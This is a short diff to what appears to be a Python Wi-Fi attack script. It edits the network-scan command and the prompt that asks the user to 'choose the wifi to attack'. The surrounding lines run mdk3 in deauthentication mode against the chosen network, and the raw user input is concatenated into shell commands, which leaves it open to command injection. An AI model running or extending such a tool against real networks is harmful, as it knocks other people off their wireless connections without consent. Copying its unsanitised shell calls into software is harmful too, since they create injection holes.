@@ -36,10 +36,11 @@ print("")
 
 print("Detecting Wireless Networks: ")
 os.system('nmcli device wifi rescan')
-os.system('nmcli device wifi list')
+os.system('nmcli device wifi rescan')
+os.system('card=`cat card.sh` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,BARS,SECURITY,SSID, dev wifi list ifname $card')
 print("")
 
-choose=raw_input("Say de ESSID of the Network: ")
+choose=raw_input("Choose the wifi to attack: ")
 if way == 1:
   os.system('card=`cat card.sh` && mdk3 wlan0mon d -n '+str(choose)+'')
 else:
